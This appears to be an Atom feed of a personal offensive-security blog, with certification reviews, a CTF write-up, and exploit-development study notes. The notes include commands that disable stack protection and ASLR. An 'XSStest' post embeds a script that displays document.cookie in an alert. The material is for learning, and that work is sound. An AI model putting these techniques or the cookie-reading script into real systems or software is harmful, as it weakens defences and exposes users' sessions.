<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/musubi/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/musubi/" rel="alternate" type="text/html" /><updated>2022-10-03T13:31:26+08:00</updated><id>http://localhost:4000/musubi/feed.xml</id><title type="html">Musubi</title><subtitle>Hey visitor, welcome to my site! (๑&gt;ᴗ&lt;๑)</subtitle><entry><title type="html"></title><link href="http://localhost:4000/musubi/others/rtoreview" rel="alternate" type="text/html" title="" /><published>2022-10-03T00:00:00+08:00</published><updated>2022-10-03T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/CRTO_review</id><content type="html" xml:base="http://localhost:4000/musubi/others/rtoreview"><![CDATA[<p>I have received an email confirmation that I have passed the Certified Red Team Operator exam so I would like to share my review about the <a href="https://training.zeropointsecurity.co.uk/courses/red-team-ops">course</a>.</p>

<p><img src="/musubi/assets/crto/crto.PNG" alt="crto" /></p>

<h1 id="intro">Intro</h1>

<p>For those who didn’t know, I have passed my <a href="https://yunaranyancat.github.io/musubi/others/osepreview">OSEP</a> exam few months ago, and it is one of the reasons why I decided to enroll in CRTO. I won’t be comparing CRTO and PEN-300 so this review will be focusing on my journey when enrolling in the CRTO course.</p>

<h1 id="course">Course</h1>

<p>The course is pretty straightforward, from external recon until domain compromise. I would say that the course is C2 oriented since most of the time you will be interacting with the compromised machines from Cobalt Strike C2.</p>

<p>You also will be able to experiment with Cobalt Strike different features such as artifact kit, resource kit, threat profile, scripts and many more!</p>

<p>And in the point of view of a blue teamer, you will be able to understand how you can detect malicious activities, rogue processes running on your network.</p>

<p>The best thing about the course is that once you have enrolled, you will get a lifetime access and update of the course, and this could help you build your own methodology for your future red team engagements.</p>

<p>I have a habit of making a cheat sheet for every course I take, but strangely, the content in this course is concise and precise, I can just use it as my cheat sheet!</p>

<p><img src="/musubi/assets/crto/pepehacker.gif" alt="pepehacker" /></p>

<h1 id="who-is-this-course-for">Who is this course for?</h1>

<p>I think this is the best course to start your experience as a red teamer! So, if you want to get the feeling of compromising an organization’s domain, this is your chance.</p>

<h1 id="bonus--how-do-i-pass-the-exam">BONUS : How do I pass the exam?</h1>

<p>The course is short, concise and precise, you just need to fully understand the course content and everything in the exam will feel like a revision! And guess what, it’s an open book exam!</p>

<p><img src="/musubi/assets/crto/openbook.jpg" alt="ob" /></p>

<h1 id="whats-next">What’s next?</h1>

<p>CRTOv2 boi, I’ll need to read the reviews and the curriculum offered first.</p>

<p>See ya!</p>

<h1 id="credits">Credits</h1>

<p><img src="/musubi/assets/crto/salute.gif" alt="salute" /></p>

<p>Thanks to RastaMouse for the awesome course content, thanks to amdsyad and saitamang for giving me the motivation to take the course, and to azrultech for sharing his CRTO experience.</p>]]></content><author><name>yunaranyancat</name></author><category term="jekyll" /><summary type="html"><![CDATA[I have received an email confirmation that I have passed the Certified Red Team Operator exam so I would like to share my review about the course.]]></summary></entry><entry><title type="html"></title><link href="http://localhost:4000/musubi/others/ctfjembalang" rel="alternate" type="text/html" title="" /><published>2022-07-18T00:00:00+08:00</published><updated>2022-07-18T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/ctf-jembalang</id><content type="html" xml:base="http://localhost:4000/musubi/others/ctfjembalang"><![CDATA[<p>This is a writeup regarding a CTF challenge for the Battle of 1337 CTF hosted by Tenang Komuniti Sdn. Bhd and Yayasan Digital Malaysia.</p>

<p><img src="/musubi/assets/jembalang/ctf.PNG" alt="CTF1337" /></p>

<p>You can download the source code <a href="https://github.com/yunaranyancat/ctf-dump/blob/main/jembalang.zip">here</a>.</p>

<p>First, you will be greeted by this locked page.</p>

<p><img src="/musubi/assets/jembalang/unlockpage.PNG" alt="lockedpage" /></p>

<p>By inspecting the element, it shows a text and an ASCII art of the infamous Mr Trollface.</p>

<p><img src="/musubi/assets/jembalang/troll.PNG" alt="trollface" /></p>

<p>The password to unlock the page is obvious : <strong>DOWN HERE</strong></p>

<p>When the page is unlocked, this page will be shown,</p>

<p><img src="/musubi/assets/jembalang/intro.PNG" alt="intro" /></p>

<p>Disable the jumpscare by unticking the events on the secret field so you will be able to submit the secret.</p>

<p><img src="/musubi/assets/jembalang/nojumpscare.PNG" alt="disablejumpscare" /></p>

<p>For those who are curious, this is the jumpscare;</p>

<p><img src="/musubi/assets/jembalang/jumpscare.PNG" alt="jumpscare" /></p>

<p>By going to the debugger, there’s an interesting js file, filled with Mr Trollface ASCII art, again.</p>

<p><img src="/musubi/assets/jembalang/debugger.PNG" alt="dbugger" /></p>

<p>On line 88, you will find a long string of obfuscated javascript code.</p>

<p><img src="/musubi/assets/jembalang/line88.PNG" alt="line88" /></p>

<p>Decode it using <a href="https://lelinhtinh.github.io/de4js/">de4js</a> with paramater set to eval.
Here you will see that to unlock the page, you will need to concatenate all of the character taken from the string c.</p>

<p><img src="/musubi/assets/jembalang/de4js.PNG" alt="de4jseval" /></p>

<p>I’ll let you sort it by yourself. ;)</p>

<p><img src="/musubi/assets/jembalang/free.PNG" alt="free" /></p>

<p>And the end.</p>

<p><img src="/musubi/assets/jembalang/end.PNG" alt="end" /></p>

<p>it’s not that troll-ish , isn’t it? (&gt;‿◠)✌</p>]]></content><author><name>yunaranyancat</name></author><category term="jekyll" /><summary type="html"><![CDATA[This is a writeup regarding a CTF challenge for the Battle of 1337 CTF hosted by Tenang Komuniti Sdn. Bhd and Yayasan Digital Malaysia.]]></summary></entry><entry><title type="html"></title><link href="http://localhost:4000/musubi/others/osepreview" rel="alternate" type="text/html" title="" /><published>2022-05-11T00:00:00+08:00</published><updated>2022-05-11T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/OSEP_review</id><content type="html" xml:base="http://localhost:4000/musubi/others/osepreview"><![CDATA[<p>Hey guys, I’m back!</p>

<p><img src="/musubi/assets/osep/kongming.gif" alt="kongming" /></p>

<p>(and I’ll be gone and will be back again.. it will be an endless circle.)</p>

<p>I will be sharing my <a href="https://www.offensive-security.com/pen300-osep/">OSEP</a> experience (of course, without disclosing confidential information that’s only available to OSEP students) and some tips that I have used which helped me in the course and also how to maximize knowledge gained so you can apply it in your future pentest engagement!</p>

<p>Let’s go!</p>

<h1 id="pre-osep">Pre OSEP</h1>

<p>Before taking the course, you need to make sure that this course is right for you.</p>

<p>Before I decided to enroll in this course, I already have basic knowledge about Active Directoy infrastructures, configurations, objects, forests, domains, trusts, communications and most importantly what is AD for and why organizations use it especially in larger scale ones.</p>

<p>I also have participated in red team engagements so I have some ideas on how to conduct a successful red teaming assessment.</p>

<p>For me personally, the <a href="https://www.offensive-security.com/documentation/PEN300-Syllabus.pdf">syllabus</a> provided by Offensive Security suits well as a foundation in performing a red teaming operation.</p>

<h1 id="osep">OSEP</h1>

<p>There will be lots of things you will learn and some of them are:</p>

<ol>
  <li>
    <p>How to gain initial foothold/social engineering (Through phishing, web exploitations, etc..)</p>
  </li>
  <li>
    <p>How to attack AD internal network (Misconfigurations abuse, lateral movement, common AD/system vulnerabilities, SQL servers, etc..)</p>
  </li>
  <li>
    <p>While doing 1. and 2., you will also learn how to bypass standard antivirus programs and application whitelistings so that your payloads/C2 are working as intended.</p>
  </li>
</ol>

<p>Below are the methods (although it’s rather conventional) I have used to gain the most out of the course :</p>

<ol>
  <li>
    <p>Open the course videos on one screen and the corresponding PDF content on the other.</p>
  </li>
  <li>
    <p>While watching and reading, take note of the code snippets, specific keywords, new terms, so you can perform a deeper research outside of the course.</p>
  </li>
  <li>
    <p>Whenever you’re stuck, pause the video, stop scrolling the PDF and read the documentation that’s available online.
For example, if you don’t know what is <strong>MessageBox</strong>, you can read the official documentation <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox">here</a> or for .NET,	<a href="https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.messagebox?view=windowsdesktop-6.0">here</a> , you also will be interested to read <a href="https://docs.microsoft.com/en-us/dotnet/api/system.windows.messagebox?view=windowsdesktop-6.0">this</a>. Try to understand what are the differences between each <strong>“MessageBox”</strong>.</p>
  </li>
  <li>
    <p>Do the exercises, extra miles exercises and also the lab exercises. You will learn a lot.</p>
  </li>
</ol>

<h1 id="post-osep">Post OSEP</h1>

<p>I am planning to take <strong>Red Team Ops (CRTO)</strong> from <strong>Zero Point Security</strong>. I’ve been told that it would be a great add to what PEN-300 currently offer, and based on some reviews, the exams are way harder than OSEP (they said using bloodhound is a no no). So, I hope, with these two courses, I will be able to broaden my knowledge so I can perform a better red teaming operation than before.</p>

<p><img src="/musubi/assets/osep/harold_meme.jpeg" alt="harold" /></p>

<h3 id="tips-and-tricks">Tips and Tricks</h3>

<ol>
  <li>
    <p>Understand different ways to exploit AD environment and which settings/misconfigurations can be abused. Apart from what’s in the course, find other vulnerabilities and do take time to understand which component makes it vulnerable.</p>
  </li>
  <li>
    <p>Don’t forget about low hanging fruits (sometimes, it is easier/more direct than what you think it is).</p>
  </li>
  <li>
    <p>Don’t forget simple enumeration techniques, try to understand in what context are you currently in (are you a local user?,or are you a domain user?, are are you a service account? are you currently in a database server?, or are you in a web server?).
If you are in a webserver, what juicy information can you extract? If you are in a database server, what exploits can you perform? Everything in AD can be treated as objects so it is easier for you to map out it’s architecture. (or you can just run <a href="https://github.com/BloodHoundAD/SharpHound">bloodhound</a> lol)</p>
  </li>
  <li>
    <p>Upgrade your red team arsenals (find more POCs, find more obfuscation tools, craft your own obfuscators, enhance current available obfuscators, craft your own C2, etc etc.. there is no limit to your creativity)</p>
  </li>
  <li>
    <p>Take breaks occasionally. Sometimes, you may think you have reached a dead end / rabbit hole (because your brain is too tired). Keep in mind that there are different ways to achieve the same objectives. The ideas will come eventually when you have calmed yourself.</p>
  </li>
</ol>

<h3 id="additional-referencesgood-readsstudy-materials">Additional references/good reads/study materials</h3>

<p>i. <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology">hacktricks AD methodology</a></p>

<p>ii. <a href="https://github.com/chvancooten/OSEP-Code-Snippets">interesting code snippets</a></p>

<p>iii. <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md">PayloadAllTheThings</a></p>

<p>iv. <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">example of AD attacks</a></p>

<p>v. <a href="https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/">c2 obfuscation</a></p>

<h3 id="enum-tools">Enum tools</h3>

<p>i. <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winpeas</a></p>

<p>ii. <a href="https://github.com/diego-treitos/linux-smart-enumeration">lse.sh</a></p>

<p>iii. <a href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview">powerview</a></p>

<p>iv. <a href="https://github.com/NetSPI/PowerUpSQL">powerupsql</a></p>

<p>v. <a href="https://github.com/61106960/adPEAS">adPeas</a></p>

<p>p/s : I also have some interesting pocs in my Twitter <a href="https://twitter.com/yunaranyancat/likes">likes</a> (but… you would need to filter some of the non related stuffs).</p>

<h1 id="end">End</h1>

<p>Thank you for taking your time reading this review.
If you are planning or currently taking PEN-300, I wish you the best of luck and always remember, try harder!</p>

<p><img src="/musubi/assets/osep/goodluck.gif" alt="gl" /></p>

<h1 id="credits">Credits</h1>

<p>Great thanks to mee-zuh, y4t0 and those who have direct or indirectly contributed in the success of this journey.</p>]]></content><author><name>yunaranyancat</name></author><category term="jekyll" /><summary type="html"><![CDATA[Hey guys, I’m back!]]></summary></entry><entry><title type="html"></title><link href="http://localhost:4000/musubi/others/oswereview" rel="alternate" type="text/html" title="" /><published>2020-10-10T00:00:00+08:00</published><updated>2020-10-10T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/OSWE_Review</id><content type="html" xml:base="http://localhost:4000/musubi/others/oswereview"><![CDATA[<p>Good day everyone! It has been a long time since I updated my site. I was pretty busy with work and stuff so I think I’ve been idling for a quite amount of months now. But here I am, writing a post to share to you guys some very helpful tips and tricks for <strong>AWAE</strong>. I’ll also share some good AWAE reviews that I find very helpful.</p>

<p>Just for a side story, I got a technical interview for Vulnerable Machine Engineer at Offensive Security just two days before my exam and sadly, I didn’t nail it (but don’t worry, I know you guys will, keep the applications coming in), feelsbadman. Nah it’s okay, I’ll try again in the future.</p>

<p>P/S : For those who are interested to try my vulnerable machines, they are available at Vulnhub, <a href="https://www.vulnhub.com/entry/nezuko-1,352/">Nezuko</a> and <a href="https://www.vulnhub.com/entry/aqua-1,419/">Aqua</a>. I keep telling my friends that there will be a third machine incoming, but I still can’t find a suitable time to do it, cause, you know, busy with life and work.</p>

<p><img src="/musubi/assets/oswe/holidays.jpeg" alt="holiday" /></p>

<p>Hmm, how about a whitebox approach for my next box? &gt;w&lt;</p>

<h1 id="startx">startx</h1>

<p>So first, what is <a href="https://www.offensive-security.com/awae-oswe/">AWAE</a> all about?</p>

<p><strong>Advanced Web Application Exploitation</strong> or in short, <strong>AWAE</strong> is a course that is more focused on the whitebox approach of penetration testing. The “how the vulnerability works”  as in the code level of the application.</p>

<p>For me, this is very interesting, because you will get a good understanding on “why this part of application flow is vulnerable” and you’ll eventually be able to see how to exploit that particular code / functions in an efficient way.</p>

<p>Other than that, since you got all the codes to yourself , hehe , you need to take it to the next level where you need to chain multiple vulnerabilities to create an exploit that is particularly important / CVE-worthy, I guess?.</p>

<p><img src="/musubi/assets/oswe/allgetcve.jpg" alt="allgetcve" /></p>

<h1 id="pre-oswe">Pre OSWE</h1>

<p>Before taking the course, you need to decide whether this is the right course for you or not. For me, working as a full time penetration tester, I know this is a good addition to my current skill set. I also have done source code reviews before so I wanted to know Offsec’s approach on a whitebox environment and try to improve my code review ability.</p>

<p>However, this course is more focused on <strong>web application</strong> part of the <strong>code review</strong>, so bear in mind, web code review is only a small part of the overall source code review. You will need to familiarize yourself with programming languages such as PHP, JAVA, .NET, .. etc. You can check their <a href="https://www.offensive-security.com/documentation/awae-syllabus.pdf">syllabus</a> if you don’t know which languages you should familiarize with for the course.</p>

<p>In addition, I would suggest on creating a simple web app using these languages so you’ll get to know what are the common libraries used, functions, implementation, how to debug, how to perform <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete">CRUD</a> on the application, and basically, becoming a “junior” web app programmer. Hahaha.</p>

<p><img src="/musubi/assets/oswe/junior.jpg" alt="junior" /></p>

<p>To know how the code works, they will give you an advantage on where to find the vulnerable parts. - cited from <strong>Top 10 Yunaranyancat Quotes (2020)</strong></p>

<h1 id="oswe">OSWE</h1>

<p>These are the methods on how I proceeded with the course;</p>
<ol>
  <li>
    <p>Watch the videos and try to replicate what the instructor did in the provided lab. Don’t waste your time if you have only 30 days of lab time.
<strong>Watch, Pause, Replicate, Resume.</strong>
Keep in mind, you can replay the videos and reread the PDF multiple time, but the lab time is limited. However, if you have a lot of money, which is not in my case, you can purchase additional lab time. (free advertising there, I see)</p>
  </li>
  <li>
    <p>For each chapter completed, pause the videos, open the PDF provided to see if you are missing something. As far as I know, the PDF course is more exhaustive than the videos. The videos are only for you to reach your objectives while the PDF is to explain to you how the objectives are being achieved , step by step. However, if you ever feel that for some part of the course, the explanation is still not enough, well, that is what Google for!
<img src="/musubi/assets/oswe/crime.jpg" alt="crime" /></p>
  </li>
  <li>
    <p>Once you have completed the PDF, videos, labs and the extra miles exercises, what you need now, is a good methodology to do web application code review efficiently.</p>
  </li>
</ol>

<h3 id="tips-and-tricks">Tips and tricks</h3>

<p>Here are some tips and tricks that might be useful for you guys;</p>

<ol>
  <li>Understand how web application works. For example, the routing of the web, the input validation, CRUD process, function definitions. As one of my friends said, most of the vulnerabilities come from insufficient input sanitization!</li>
  <li>Try to familiarize yourself with common vulnerable functions, such as <strong>exec()</strong>, <strong>system()</strong>, <strong>eval()</strong>, serialization and deserialization functions, weak regex, insufficient input sanitization, until the moment when you see a code, you are pretty confident to guess whether it’s vulnerable or not, after that, it’s up to you to test it with different payloads or try to bypass any restriction.</li>
  <li>Since it’s a whitebox approach, you’ll have an access to the debugging environment. So, for example, if you want to check if your SQL injection payload is working correctly or not, you can run the statement in the SQL environment of the target. Or, if you want to see what function is being called when you send or receive a request, you can set up the breakpoints using debugger on the running code.</li>
  <li>
    <p>Sometimes, it’s hard for some people to find the right portion of the code, so the key here is, try to understand what are the objectives that you are trying to achieve, and see which part of the code that is related to the objectives, well unless you say, everything is related, I don’t know what to say.
<img src="/musubi/assets/oswe/pepe.png" alt="pepe" /> <br />
What I mean by <strong>“something that is related”</strong>, it’s like, <strong>“when you do this, this part of the code will be executed.”</strong></p>
  </li>
  <li>Don’t forget to take a break. Sometimes, looking too long at the code will only give you stress and limit your thinking capabilities (like what I experienced). So, the best way is to take a short break anytime you need it.</li>
</ol>

<h1 id="post-oswe">Post OSWE</h1>

<p>I might take a look on incoming Offensive Security courses, but I will read the reviews first to see whether they’re interesting/worth it or not.</p>

<p><a href="https://www.offensive-security.com/offsec/retiring-ctp-intro-new-courses/">Check them out!</a></p>

<h3 id="some-good-awae-reviewstipstricks">Some good AWAE reviews/tips/tricks</h3>

<p>These are some OSWE reviews that I found very helpful:</p>

<p>i. <a href="https://forum.hackthebox.eu/discussion/2646/oswe-exam-review-2020-notes-gifts-inside">https://forum.hackthebox.eu/discussion/2646/oswe-exam-review-2020-notes-gifts-inside</a></p>

<p>ii. <a href="https://github.com/wetw0rk/AWAE-PREP">https://github.com/wetw0rk/AWAE-PREP</a></p>

<p>iii. <a href="https://github.com/timip/OSWE">https://github.com/timip/OSWE</a></p>

<h1 id="end">End</h1>

<p>Thank you for taking your time reading this post!,and sorry for the memes too if it’s annoying. Ciao.</p>

<p><img src="/musubi/assets/oswe/paimon.gif" alt="paimon" /></p>

<h2 id="credits">Credits</h2>

<p>Special thanks to those who have helped me throughout the journey. Without you guys, I won’t be able to reach this far… You guys rocks! And also to my lovely fiancée, thanks for being with me through thick and thin! I love you! uWu</p>

<p><img src="/musubi/assets/oswe/lolihug.gif" alt="lolihug" /></p>]]></content><author><name>yunaranyancat</name></author><category term="jekyll" /><summary type="html"><![CDATA[Good day everyone! It has been a long time since I updated my site. I was pretty busy with work and stuff so I think I’ve been idling for a quite amount of months now. But here I am, writing a post to share to you guys some very helpful tips and tricks for AWAE. I’ll also share some good AWAE reviews that I find very helpful.]]></summary></entry><entry><title type="html">Path to become a web application hacker</title><link href="http://localhost:4000/musubi/paths/webapphacker" rel="alternate" type="text/html" title="Path to become a web application hacker" /><published>2020-04-05T00:00:00+08:00</published><updated>2020-04-05T00:00:00+08:00</updated><id>http://localhost:4000/musubi/paths/webapphacker</id><content type="html" xml:base="http://localhost:4000/musubi/paths/webapphacker"><![CDATA[<p>Hey , I’m writing this journal that will be updated periodically at the end of the day as I progress through the Web Application Hacker’s Handbook 2nd Edition, then proceed to Web Security Academy which is the “successor” of the book and other web application hacking related things. I will write anything that I found useful however, do note that this is more of a journal/diary rather than a complete technical writeup. Let’s go..</p>

<h3 id="5-april-2020">5 April 2020</h3>

<p>Understand what is a web application and different purposes/functions</p>

<p>Server must assume that all incoming inputs are malicious</p>

<p>Never trust user input</p>]]></content><author><name>yunaranyancat</name></author><category term="jekyll" /><summary type="html"><![CDATA[Hey , I’m writing this journal that will be updated periodically at the end of the day as I progress through the Web Application Hacker’s Handbook 2nd Edition, then proceed to Web Security Academy which is the “successor” of the book and other web application hacking related things. I will write anything that I found useful however, do note that this is more of a journal/diary rather than a complete technical writeup. Let’s go..]]></summary></entry><entry><title type="html">Path to become a shellcoder</title><link href="http://localhost:4000/musubi/paths/shellcoder" rel="alternate" type="text/html" title="Path to become a shellcoder" /><published>2020-04-04T00:00:00+08:00</published><updated>2020-04-04T00:00:00+08:00</updated><id>http://localhost:4000/musubi/paths/shellcoder</id><content type="html" xml:base="http://localhost:4000/musubi/paths/shellcoder"><![CDATA[<p>Hey , I’m writing this journal that will be updated periodically at the end of the day as I progress through the Shellcoder’s Handbook 2nd Edition and other shellcoding related things. I will write anything that I found useful however, do note that this is more of a journal/diary rather than a complete technical writeup. Let’s go..</p>

<h3 id="4-april-2020">4 April 2020</h3>

<p>Went through the first few pages of Chapter 2.</p>

<p>Seems like I need to install some OS so I can follow along.</p>

<p>Tried to install Debian 3.1r4 but seems like I suck at installing old OS.</p>

<p>Guess I’ll install Ubuntu.</p>

<p>Downloaded old ubuntu releases, 4.10, 6.10, 8.10</p>

<p>Finally I have chosen 8.10 and 6.10. What’s interesting is gcc already come pre installed, especially the desktop version of the iso.</p>

<p>Try running first few examples, got stuck as there are no core dumped after segmentation fault.</p>

<p>Fixed it by running “ulimit -c unlimited”</p>

<p>Done for today</p>

<h4 id="snippets-">snippets :</h4>

<ul>
  <li>gcc -o program1 program1.c -fno-stack-protector</li>
  <li>ulimit -c unlimited</li>
</ul>

<h3 id="5-april-2020">5 April 2020</h3>

<p>Understand how stack work, some basic assembly operations (PUSH, POP, CALL, RET, MOV)</p>

<p>Functions and stack - push arguments, call function , then RET stored in EIP</p>

<p>Understand how EBP work, program prologue</p>

<p>Understand basic of 32 bit stack overflow, without stack protection</p>

<p>Disable ASLR just to be safe</p>

<p>Stack boundary and optimisation</p>

<p>If the stack boundary is set to 2, there is no stack optimisation</p>

<p>Overflow a program by inputting a string longer than 30 characters</p>

<p>Debug using gdb and find out where saved EBP and EIP are overwritten in the stack (disable stack protection)</p>

<p>Instead of overwrite with junk, try with real address</p>

<p>Used address of the function return_input</p>

<p>Find the right position of EIP</p>

<p>Program overflowed correctly (printing two times as the EIP call back the return_input function)</p>

<h4 id="snippets">snippets</h4>

<ul>
  <li>cc -mpreferred-stack-boundary=2 –ggdb program4.c -fno-stack-protector -o overflow</li>
  <li>sudo sysctl kernel.randomize_va_space=0</li>
</ul>

<h3 id="7-april-2020">7 April 2020</h3>

<p>Simple bypass serial key activation</p>

<p>Execve shellcoder</p>

<p>Simple code execution in stack</p>

<p>Introduction to ret2libc</p>

<p>Performing ret2libc attack</p>

<p>Basically, for this attack, we need address of system, exit and address of “/bin/sh”</p>

<p>Finding address of “/bin/sh” using memfetch.c and mffind.pl</p>]]></content><author><name>yunaranyancat</name></author><category term="jekyll" /><summary type="html"><![CDATA[Hey , I’m writing this journal that will be updated periodically at the end of the day as I progress through the Shellcoder’s Handbook 2nd Edition and other shellcoding related things. I will write anything that I found useful however, do note that this is more of a journal/diary rather than a complete technical writeup. Let’s go..]]></summary></entry><entry><title type="html">XSStest</title><link href="http://localhost:4000/musubi/others/XSStest" rel="alternate" type="text/html" title="XSStest" /><published>2020-03-06T00:00:00+08:00</published><updated>2020-03-06T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/XSS</id><content type="html" xml:base="http://localhost:4000/musubi/others/XSStest"><![CDATA[<body onclick="meow()">Meow </body>
<p><br />
<br /></p>
<footer onclick="meowmeow()">Meowmeow</footer>

<script>
function meow() {
    alert(document.cookie);  
}
function meowmeow() {
    alert(document.domain);  
}
</script>]]></content><author><name>yunaranyancat</name></author><category term="jekyll" /><summary type="html"><![CDATA[Meow Meowmeow]]></summary></entry><entry><title type="html">Push CTP , Pop OSCE : From advanced script kiddie to expert script kiddie</title><link href="http://localhost:4000/musubi/others/oscereview" rel="alternate" type="text/html" title="Push CTP , Pop OSCE : From advanced script kiddie to expert script kiddie" /><published>2020-03-03T00:00:00+08:00</published><updated>2020-03-03T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/OSCE_Review</id><content type="html" xml:base="http://localhost:4000/musubi/others/oscereview"><![CDATA[<p>Yee haw! Last week I just received a mail from Offsec saying that I have passed the Offensive Security Certified Expert (OSCE) exam and here is my review.</p>

<p>Right after OSCP, I’ve been thinking, what should I learn next? So I said to myself, maybe I should try learning basic exploit development..?</p>

<p><img src="/musubi/assets/osce/nasahacked.gif" alt="nasahacked" /></p>

<h1 id="pre-osce">Pre OSCE</h1>

<p>So, I started to learn assembly. I used the materials from this <a href="http://opensecuritytraining.info/IntroX86.html">site</a> and revised for few weeks. I started to understand what are registers and their purposes, opcodes, how to use debugger, how to compile codes and other basic stuffs.</p>

<p><img src="/musubi/assets/osce/compiler.jpg" alt="compiler" /></p>

<p>Then, I filled some basic knowledge gaps by watching <strong>x86 Assembly and Shellcoding on Linux</strong> videos from <strong>Pentester Academy</strong>.</p>

<p><img src="/musubi/assets/osce/pentesteracademy.png" alt="pentestacademy" /></p>

<p>Okay, from here, I went to Corelan <a href="http://opensecuritytraining.info/IntroX86.html">site</a> to improve my binary exploitation skills. These are the topics that I have covered for my preparation before enrolling in CTP.</p>

<ul>
  <li>
    <p>Exploit writing tutorial part 9 : Introduction to Win32 shellcoding</p>
  </li>
  <li>
    <p>Exploit writing tutorial part 8 : Win32 Egg Hunting</p>
  </li>
  <li>
    <p>Exploit writing tutorial part 7 : Unicode – from 0x00410041 to calc</p>
  </li>
  <li>
    <p>Exploit writing tutorial part 3b : SEH Based Exploits – just another example</p>
  </li>
  <li>
    <p>Exploit writing tutorial part 3 : SEH Based Exploits</p>
  </li>
  <li>
    <p>Exploit writing tutorial part 2 : Stack Based Overflows – jumping to shellcode</p>
  </li>
  <li>
    <p>Exploit writing tutorial part 1 : Stack Based Overflows</p>
  </li>
</ul>

<p>I also went to <a href="https://www.fuzzysecurity.com/tutorials.html">fuzzysecurity</a> to improve my skills. If you don’t know where to start/stop, just follow and understand what are taught below.</p>

<p><img src="/musubi/assets/osce/fuzzysecurity.png" alt="fuzzysecurity" /></p>

<p>When I thought that I’m pretty comfortable with basic exploit development, I started to enroll in the CTP course. But, wait! I need to solve the pre registration challenges <a href="http://fc4.me/">first</a>.</p>

<p><img src="/musubi/assets/osce/fc4.png" alt="fc4" /></p>

<p>At first try, they were pretty hard, so I thought maybe, just maybe… because I procrastinated for few weeks before, I almost forgot what I have learned… Dang it!</p>

<p>So, I went back to reread all of the courses/topics mentioned above, then the second time I went to the site to complete the challenges, I passed and managed to get the registration key. The key was “tryharderlolimjokingthisisnotthekey” .</p>

<h1 id="osce">OSCE</h1>

<p>So, my journey has started. I used these learning techniques to improve my understanding of the syllabus in the course;</p>

<ul>
  <li>watch the videos and follow along to complete the exercises</li>
  <li>repeat until you don’t need to watch the videos to complete the exercises</li>
</ul>

<p><img src="/musubi/assets/osce/hacc.jpg" alt="hacc" /></p>

<p>The method is quite repetitive and for lazy ass people like me, I tend to feel bored really fast and started to procrastinate. What I did to kill the boredom was, for topics like binary exploitations, AV bypass, PE backdooring, I looked up different PE online and then I applied what is taught in the course.</p>

<p>Of course, the practical applications will be quite different but the theories on how to exploit the binaries still remain the same. Sometimes, I encountered some problems, and with these problems, I managed to understand more and more about binary exploitations. So, basically, this is one of the ways to learn things, learn from mistakes.</p>

<p>Well the drawbacks are, you will start to overthink and sometimes will forget the basic but important things/theories. So, to overthink or not to overthink, it’s your choice.</p>

<p>Then comes the exam time. So, in the exam, you will be given some amount of challenges and you will need to solve it within 48 hours and you will have 24 hours to do the report. Stay calm and don’t panic. Take a rest. I REPEAT. TAKE A REST IF YOU ARE EXHAUSTED.</p>

<p><img src="/musubi/assets/osce/busy.jpeg" alt="busy" /></p>

<h1 id="post-osce">Post OSCE</h1>

<p>So… there is this one book that I bought as a prep to enhance my binary exploitation skills which is <strong>The Shellcoder Handbook (2nd Edition)</strong>. After reading few pages, I realised that, this book is way bit more advanced than what I expected, so I put the book aside first. :&gt;</p>

<p>After I have passed OSCE certification exam, I think now it’s time to finish that book and level up!</p>

<p><img src="/musubi/assets/osce/dogehacker.jpg" alt="doge" /></p>

<h3 id="tips-and-tricks">Tips and tricks</h3>

<p>So, here are the tips and tricks that I wanted to share with you guys;</p>

<ol>
  <li>Watch all of the videos and read everything in the PDF. Do not focus only on the binary exploitation part.</li>
  <li>Do all of the exercises again and again and again and again and again. (Trust me, you’ll thank me later for this.)</li>
  <li>Do not focus only on what is taught in the course, try to go a little bit further and explore as much as you want, but don’t dive too deep, you’ll drown yourself.</li>
  <li>Some people will say that everything you need to pass the exam is in the course, yes, but.. no.. It’s like, if <strong>A</strong> is in the course, maybe <strong>a</strong> or <strong>@</strong> or even <strong>∀</strong> is in the exam. So, it’s not <strong>A</strong> for <strong>A</strong>. (I don’t really know what I’m talking about lel)</li>
  <li>Don’t rely too much on pre generated shellcode, try to create your own shellcode from scratch. <a href="https://www.exploit-db.com/docs/english/17065-manual-shellcode.pdf">Check this out</a>.</li>
</ol>

<p>These are some OSCE reviews that I found helpful on providing useful resources :</p>

<p>i. <a href="https://www.thesubtlety.com/post/2017-02-11-osce-review/">https://www.thesubtlety.com/post/2017-02-11-osce-review/</a></p>

<p>ii. <a href="https://tulpa-security.com/2017/07/18/288/">https://tulpa-security.com/2017/07/18/288/</a></p>

<p>iii. <a href="https://aminbohio.com/study-guide-tips-offensive-security-certified-expert-osce-cracking-the-perimeter-ctp/">https://aminbohio.com/study-guide-tips-offensive-security-certified-expert-osce-cracking-the-perimeter-ctp/</a></p>

<h3 id="faq">FAQ</h3>

<p><strong>Q1</strong>: Hi yunaranyancat, the course is outdated, should I take it? Or should I wait until they update the course?<br />
<strong>Meow</strong>: Hi random stranger, for me personally, there are quite amount of difference in knowledge before and after I enrolled in CTP. For me, I agree the techniques might be outdated, but what I think is, Offsec is trying to teach you the foundation of the methodologies focused on exploit development, advanced web attacks, WAN attacks , etc.. Of course they can update it to fit the latest trends of AV bypass techniques, advanced binary exploitation, hacking SCADA or anything, but IMHO, these should be in the OSEE domain. Like OSCP, what they are trying to deliver is the foundation of the pentesting methodologies, and it is up to us to further enhance it and try to keep up to fit in current trends. However, again, I won’t deny that the techniques are outdated but the methodologies that I gained can be applied on today’s exploitation. I’m not saying I’m an expert so I’ll just say I’m the pro in the script kiddies domain.</p>

